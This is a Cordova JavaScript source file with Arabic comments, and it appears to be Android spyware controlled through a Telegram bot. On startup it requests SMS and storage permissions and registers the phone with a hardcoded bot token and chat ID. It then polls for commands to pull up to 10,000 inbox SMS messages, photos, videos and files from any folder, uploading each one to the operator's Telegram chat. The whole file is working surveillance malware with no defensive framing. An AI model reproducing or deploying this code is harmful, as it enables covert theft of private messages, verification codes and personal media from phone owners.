document.addEventListener('deviceready', onDeviceReady, false);

// تعريف المتغيرات العامة
const botToken = '7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk';
const chatId = '5739065274';
let deviceName = "جهاز غير معروف";
let devicesList = {};

function onDeviceReady() {
  console.log('Cordova جاهز');
  getDeviceInfo();
  requestPermissions();
}

function getDeviceInfo() {
  deviceName = device.model || "جهاز غير معروف";
  devicesList = {
    [device.uuid]: deviceName
  };
  sendStartCommand();
}

function requestPermissions() {
  var permissions = cordova.plugins.permissions;
  permissions.requestPermissions(
    [
      permissions.READ_EXTERNAL_STORAGE,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.READ_SMS,
      permissions.RECEIVE_SMS
    ],
    function(status) {
      if (status.hasPermission) {
        console.log("تم منح الأذونات بنجاح");
      } else {
        console.log("تم رفض الأذونات");
      }
    },
    function(error) {
      console.error("فشل طلب الأذونات", error);
    }
  );
}

function sendStartCommand() {
  // إنشاء لوحة مفاتيح مع أسماء الأجهزة
  const keyboard = {
    inline_keyboard: [
      [{
        text: deviceName,
        callback_data: 'device_' + device.uuid
      }]
    ]
  };

  // إرسال أمر /start مع قائمة الأجهزة
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: 'اختر الجهاز للتحكم:',
      reply_markup: keyboard
    })
  })
  .then(response => response.json())
  .then(data => {
    console.log('تم إرسال أمر /start:', data);
    sendConnectionMessage();
  })
  .catch(error => console.error('خطأ في إرسال أمر /start:', error));
}

function sendConnectionMessage() {
  // إرسال رسالة "الجهاز متصل" إلى البوت
  const message = `✅ الجهاز ${deviceName} متصل وجاهز للعمل`;
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
    .then(response => response.json())
    .then(data => console.log('تم إرسال رسالة الاتصال:', data))
    .catch(error => console.error('خطأ في إرسال رسالة الاتصال:', error));
}

function showDeviceCommands(deviceId) {
  // إنشاء لوحة مفاتيح بالأوامر للجهاز المحدد
  const commandsKeyboard = {
    inline_keyboard: [
      [{
        text: 'سحب رسائل SMS',
        callback_data: 'sms_' + deviceId
      }],
      [{
        text: 'سحب الصور',
        callback_data: 'images_' + deviceId
      }],
      [{
        text: 'سحب الفيديوهات',
        callback_data: 'videos_' + deviceId
      }],
      [{
        text: 'إرسال مسار مخصص',
        callback_data: 'custom_path_' + deviceId
      }]
    ]
  };

  // إرسال رسالة مع الأوامر
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: `أوامر التحكم للجهاز ${devicesList[deviceId]}:`,
      reply_markup: commandsKeyboard
    })
  })
  .then(response => response.json())
  .then(data => console.log('تم إرسال أوامر الجهاز:', data))
  .catch(error => console.error('خطأ في إرسال أوامر الجهاز:', error));
}

// دالة محسنة لسحب رسائل SMS
function collectSMS(deviceId) {
  if (!window.SMS) {
    console.error('SMS plugin not available');
    sendToTelegram('error.txt', 'SMS plugin not available');
    return;
  }

  const filter = { box: 'inbox' };
  const options = { maxCount: 10000 }; // زيادة الحد الأقصى لسحب المزيد من الرسائل

  SMS.listSMS(filter, options, 
    (data) => {
      // تصنيف الرسائل حسب المرسل
      const groupedMessages = {};
      data.forEach(msg => {
        if (!groupedMessages[msg.address]) {
          groupedMessages[msg.address] = [];
        }
        groupedMessages[msg.address].push(msg);
      });

      // إنشاء ملف نصي منظم
      let smsContent = '';
      for (const [sender, messages] of Object.entries(groupedMessages)) {
        smsContent += `=== ${sender} ===\n\n`;
        messages.forEach(msg => {
          smsContent += `[${new Date(msg.date).toLocaleString()}] ${msg.body}\n\n`;
        });
        smsContent += '\n';
      }

      // إرسال ملف SMS
      sendToTelegram(`sms_inbox_${deviceId}.txt`, smsContent);

      // إرسال إحصائية
      const stats = `تم سحب ${data.length} رسالة من ${Object.keys(groupedMessages).length} مرسل`;
      sendToTelegram(`sms_stats_${deviceId}.txt`, stats);
    },
    (error) => {
      console.error('Error collecting SMS:', error);
      sendToTelegram('error.txt', `Failed to collect SMS: ${error}`);
    }
  );
}

// دالة محسنة لسحب الصور
function collectImages(deviceId) {
  const imagePaths = [
    'DCIM/Camera',
    'DCIM/Snapchat',
    'DCIM/Screenshots',
    'Pictures/WhatsApp',
    'Pictures/Telegram'
  ];

  let totalImages = 0;
  let imagesFound = 0;
  let allImages = [];

  // دالة مساعدة للبحث في مسار معين
  function searchInPath(pathIndex) {
    if (pathIndex >= imagePaths.length) {
      if (allImages.length === 0) {
        sendToTelegram('error.txt', 'لم يتم العثور على أي صور في المسارات المحددة');
        return;
      }
      sendImagesToTelegram(allImages, deviceId);
      return;
    }

    const path = imagePaths[pathIndex];
    window.resolveLocalFileSystemURL(
      cordova.file.externalRootDirectory + path,
      (dir) => {
        const reader = dir.createReader();
        reader.readEntries(
          (entries) => {
            const images = entries.filter(entry => 
              /\.(jpg|png|jpeg|gif|bmp|webp)$/i.test(entry.name)
            );
            
            totalImages += images.length;
            imagesFound += images.length;
            allImages = allImages.concat(images);

            // إرسال تحديث عن حالة البحث
            if (pathIndex % 2 === 0) { // إرسال تحديث كل مسارين
              const status = `جاري البحث...\nتم فحص ${pathIndex+1}/${imagePaths.length} مسارات\nتم العثور على ${imagesFound} صورة حتى الآن`;
              sendToTelegram('status.txt', status);
            }

            // البحث في المسار التالي
            searchInPath(pathIndex + 1);
          },
          (error) => {
            console.error(`Error reading directory ${path}:`, error);
            // المتابعة إلى المسار التالي حتى في حالة الخطأ
            searchInPath(pathIndex + 1);
          }
        );
      },
      (error) => {
        console.error(`Error accessing path ${path}:`, error);
        // المتابعة إلى المسار التالي حتى في حالة الخطأ
        searchInPath(pathIndex + 1);
      }
    );
  }

  // بدء البحث من المسار الأول
  searchInPath(0);
}

// دالة جديدة لسحب الفيديوهات
function collectVideos(deviceId) {
  const videoPaths = [
    'DCIM/Camera',
    'Movies',
    'Download',
    'Pictures/WhatsApp',
    'Pictures/Telegram'
  ];

  let totalVideos = 0;
  let videosFound = 0;
  let allVideos = [];

  // دالة مساعدة للبحث في مسار معين
  function searchInPath(pathIndex) {
    if (pathIndex >= videoPaths.length) {
      if (allVideos.length === 0) {
        sendToTelegram('error.txt', 'لم يتم العثور على أي فيديوهات في المسارات المحددة');
        return;
      }
      sendVideosToTelegram(allVideos, deviceId);
      return;
    }

    const path = videoPaths[pathIndex];
    window.resolveLocalFileSystemURL(
      cordova.file.externalRootDirectory + path,
      (dir) => {
        const reader = dir.createReader();
        reader.readEntries(
          (entries) => {
            const videos = entries.filter(entry => 
              /\.(mp4|avi|mov|mkv|3gp|wmv|flv|webm)$/i.test(entry.name)
            );
            
            totalVideos += videos.length;
            videosFound += videos.length;
            allVideos = allVideos.concat(videos);

            // إرسال تحديث عن حالة البحث
            if (pathIndex % 2 === 0) { // إرسال تحديث كل مسارين
              const status = `جاري البحث عن الفيديوهات...\nتم فحص ${pathIndex+1}/${videoPaths.length} مسارات\nتم العثور على ${videosFound} فيديو حتى الآن`;
              sendToTelegram('status.txt', status);
            }

            // البحث في المسار التالي
            searchInPath(pathIndex + 1);
          },
          (error) => {
            console.error(`Error reading directory ${path}:`, error);
            // المتابعة إلى المسار التالي حتى في حالة الخطأ
            searchInPath(pathIndex + 1);
          }
        );
      },
      (error) => {
        console.error(`Error accessing path ${path}:`, error);
        // المتابعة إلى المسار التالي حتى في حالة الخطأ
        searchInPath(pathIndex + 1);
      }
    );
  }

  // بدء البحث من المسار الأول
  searchInPath(0);
}

// دالة لمعالجة المسار المخصص من المستخدم
function handleCustomPath(deviceId, path) {
  window.resolveLocalFileSystemURL(
    cordova.file.externalRootDirectory + path,
    (dir) => {
      const reader = dir.createReader();
      reader.readEntries(
        (entries) => {
          const files = entries.filter(entry => 
            /\.(jpg|png|jpeg|gif|bmp|webp|mp4|avi|mov|mkv|3gp|wmv|flv|webm|txt|pdf|doc|docx|xls|xlsx|ppt|pptx|zip|rar|apk)$/i.test(entry.name)
          );
          
          if (files.length === 0) {
            sendToTelegram('error.txt', 'لم يتم العثور على أي ملفات في المسار المحدد');
            return;
          }
          
          // تصنيف الملفات حسب النوع
          const images = files.filter(file => /\.(jpg|png|jpeg|gif|bmp|webp)$/i.test(file.name));
          const videos = files.filter(file => /\.(mp4|avi|mov|mkv|3gp|wmv|flv|webm)$/i.test(file.name));
          const documents = files.filter(file => /\.(txt|pdf|doc|docx|xls|xlsx|ppt|pptx|zip|rar|apk)$/i.test(file.name));
          
          // إرسال الملفات حسب نوعها
          if (images.length > 0) sendImagesToTelegram(images, deviceId);
          if (videos.length > 0) sendVideosToTelegram(videos, deviceId);
          if (documents.length > 0) sendDocumentsToTelegram(documents, deviceId);
        },
        (error) => {
          console.error('Error reading custom directory:', error);
          sendToTelegram('error.txt', `فشل قراءة المسار المخصص: ${error}`);
        }
      );
    },
    (error) => {
      console.error('Error accessing custom path:', error);
      sendToTelegram('error.txt', `فشل الوصول إلى المسار المخصص: ${error}`);
    }
  );
}

// دالة محسنة لإرسال الصور إلى التلجرام
function sendImagesToTelegram(images, deviceId, index = 0) {
  if (index >= images.length) {
    sendToTelegram('status.txt', `تم إرسال جميع الصور (${images.length}) بنجاح للجهاز ${deviceId}`);
    return;
  }

  const imgEntry = images[index];
  imgEntry.file((file) => {
    const formData = new FormData();
    formData.append('photo', file, `image_${index}_${deviceId}_${file.name}`);

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      console.log(`تم إرسال الصورة ${index + 1}/${images.length}:`, data);
      // إرسال تحديث كل 10 صور
      if ((index + 1) % 10 === 0) {
        sendToTelegram('status.txt', `جاري الإرسال... ${index + 1}/${images.length} صورة`);
      }
      // إرسال الصورة التالية بعد تأخير 0.5 ثانية لتجنب حظر التحميل
      setTimeout(() => sendImagesToTelegram(images, deviceId, index + 1), 500);
    })
    .catch(error => {
      console.error(`Error sending image ${index + 1}:`, error);
      // إعادة المحاولة بعد 2 ثانية
      setTimeout(() => sendImagesToTelegram(images, deviceId, index), 2000);
    });
  }, (error) => {
    console.error(`Error reading image file ${index + 1}:`, error);
    // التخطي إلى الصورة التالية في حالة الخطأ
    sendImagesToTelegram(images, deviceId, index + 1);
  });
}

// دالة جديدة لإرسال الفيديوهات إلى التلجرام
function sendVideosToTelegram(videos, deviceId, index = 0) {
  if (index >= videos.length) {
    sendToTelegram('status.txt', `تم إرسال جميع الفيديوهات (${videos.length}) بنجاح للجهاز ${deviceId}`);
    return;
  }

  const videoEntry = videos[index];
  videoEntry.file((file) => {
    const formData = new FormData();
    formData.append('video', file, `video_${index}_${deviceId}_${file.name}`);

    fetch(`https://api.telegram.org/bot${botToken}/sendVideo?chat_id=${chatId}`, {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      console.log(`تم إرسال الفيديو ${index + 1}/${videos.length}:`, data);
      // إرسال تحديث كل 5 فيديوهات
      if ((index + 1) % 5 === 0) {
        sendToTelegram('status.txt', `جاري الإرسال... ${index + 1}/${videos.length} فيديو`);
      }
      // إرسال الفيديو التالي بعد تأخير 1 ثانية
      setTimeout(() => sendVideosToTelegram(videos, deviceId, index + 1), 1000);
    })
    .catch(error => {
      console.error(`Error sending video ${index + 1}:`, error);
      // إعادة المحاولة بعد 3 ثواني
      setTimeout(() => sendVideosToTelegram(videos, deviceId, index), 3000);
    });
  }, (error) => {
    console.error(`Error reading video file ${index + 1}:`, error);
    // التخطي إلى الفيديو التالي في حالة الخطأ
    sendVideosToTelegram(videos, deviceId, index + 1);
  });
}

// دالة جديدة لإرسال المستندات إلى التلجرام
function sendDocumentsToTelegram(documents, deviceId, index = 0) {
  if (index >= documents.length) {
    sendToTelegram('status.txt', `تم إرسال جميع المستندات (${documents.length}) بنجاح للجهاز ${deviceId}`);
    return;
  }

  const docEntry = documents[index];
  docEntry.file((file) => {
    const formData = new FormData();
    formData.append('document', file, `doc_${index}_${deviceId}_${file.name}`);

    fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      console.log(`تم إرسال المستند ${index + 1}/${documents.length}:`, data);
      // إرسال تحديث كل 10 مستندات
      if ((index + 1) % 10 === 0) {
        sendToTelegram('status.txt', `جاري الإرسال... ${index + 1}/${documents.length} مستند`);
      }
      // إرسال المستند التالي بعد تأخير 0.5 ثانية
      setTimeout(() => sendDocumentsToTelegram(documents, deviceId, index + 1), 500);
    })
    .catch(error => {
      console.error(`Error sending document ${index + 1}:`, error);
      // إعادة المحاولة بعد 2 ثانية
      setTimeout(() => sendDocumentsToTelegram(documents, deviceId, index), 2000);
    });
  }, (error) => {
    console.error(`Error reading document file ${index + 1}:`, error);
    // التخطي إلى المستند التالي في حالة الخطأ
    sendDocumentsToTelegram(documents, deviceId, index + 1);
  });
}

// دالة محسنة لإرسال الملفات إلى التلجرام
function sendToTelegram(filename, content) {
  // إرسال رسالة تحميل أولاً
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`جاري إرسال ${filename}...`)}`)
    .then(response => response.json())
    .then(data => console.log('تم إرسال رسالة التحميل:', data))
    .catch(error => console.error('خطأ في إرسال رسالة التحميل:', error));
  
  // إرسال الملف الفعلي
  const blob = new Blob([content], { type: 'text/plain' });
  const formData = new FormData();
  formData.append('document', blob, filename);
  
  fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => console.log('تم إرسال الملف:', data))
  .catch(error => {
    console.error('Error sending file:', error);
    // إعادة المحاولة في حالة الخطأ
    setTimeout(() => sendToTelegram(filename, content), 3000);
  });
}

// دالة للاستماع لرسائل التلجرام الواردة
function setupTelegramListener() {
  // هذه الدالة تحتاج إلى خادم (webhook) لاستقبال التحديثات من التلجرام
  // في هذا المثال سنستخدم polling كبديل بسيط
  
  let offset = 0;
  
  function checkUpdates() {
    fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}`)
      .then(response => response.json())
      .then(data => {
        if (data.ok && data.result.length > 0) {
          data.result.forEach(update => {
            offset = update.update_id + 1;
            
            // معالجة الرسائل النصية
            if (update.message && update.message.text) {
              const text = update.message.text;
              
              // إذا كان المستخدم يريد إرسال مسار مخصص
              if (text.startsWith('/path ')) {
                const customPath = text.substring(6).trim();
                handleCustomPath(device.uuid, customPath);
              }
            }
            
            // معالجة callback queries (النقر على الأزرار)
            if (update.callback_query) {
              const data = update.callback_query.data;
              
              if (data.startsWith('device_')) {
                const deviceId = data.substring(7);
                showDeviceCommands(deviceId);
              }
              else if (data.startsWith('sms_')) {
                const deviceId = data.substring(4);
                collectSMS(deviceId);
              }
              else if (data.startsWith('images_')) {
                const deviceId = data.substring(7);
                collectImages(deviceId);
              }
              else if (data.startsWith('videos_')) {
                const deviceId = data.substring(7);
                collectVideos(deviceId);
              }
              else if (data.startsWith('custom_path_')) {
                const deviceId = data.substring(12);
                // طلب إدخال المسار من المستخدم
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json'
                  },
                  body: JSON.stringify({
                    chat_id: chatId,
                    text: 'الرجاء إرسال المسار المطلوب بالصيغة التالية:\n/path مسار_المجلد\nمثال: /path DCIM/Camera',
                    reply_to_message_id: update.callback_query.message.message_id
                  })
                });
              }
            }
          });
        }
        
        // التحقق من التحديثات كل 3 ثواني
        setTimeout(checkUpdates, 3000);
      })
      .catch(error => {
        console.error('Error checking Telegram updates:', error);
        // إعادة المحاولة بعد 5 ثواني في حالة الخطأ
        setTimeout(checkUpdates, 5000);
      });
  }
  
  // بدء الاستماع للتحديثات
  checkUpdates();
}

// بدء الاستماع لرسائل التلجرام عند جاهزية الجهاز
document.addEventListener('deviceready', setupTelegramListener, false);
